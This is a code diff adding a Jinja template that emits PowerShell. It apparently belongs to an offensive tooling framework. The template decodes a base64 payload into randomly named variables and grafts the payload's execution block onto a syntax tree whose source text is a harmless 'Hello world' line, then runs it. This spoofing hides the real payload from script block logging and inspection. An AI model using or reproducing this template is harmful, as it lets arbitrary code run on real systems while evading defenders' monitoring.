@@ -1,0 +1,14 @@
+{% macro random_string(len) -%}{% for i in range(0,len) -%}{{ [0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f"]|random }}{% endfor %}{%- endmacro -%}
+{% set strings = [random_string(8), random_string(8), random_string(8), random_string(8), random_string(8)] %}
+${{ strings[0] }} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{{ input }}"))
+${{ strings[1] }} = [ScriptBlock]::Create("Write-Output 'Hello world'").Ast
+${{ strings[2] }} = [ScriptBlock]::Create(${{ strings[0] }}).Ast
+${{ strings[3] }} = [System.Management.Automation.Language.ScriptBlockAst]::new(${{ strings[1] }}.Extent,
+   $null,
+   $null,
+   $null,
+   ${{ strings[2] }}.EndBlock.Copy(),
+   $null
+)
+${{ strings[4] }} = ${{ strings[3] }}.GetScriptBlock()
+& ${{ strings[4] }}
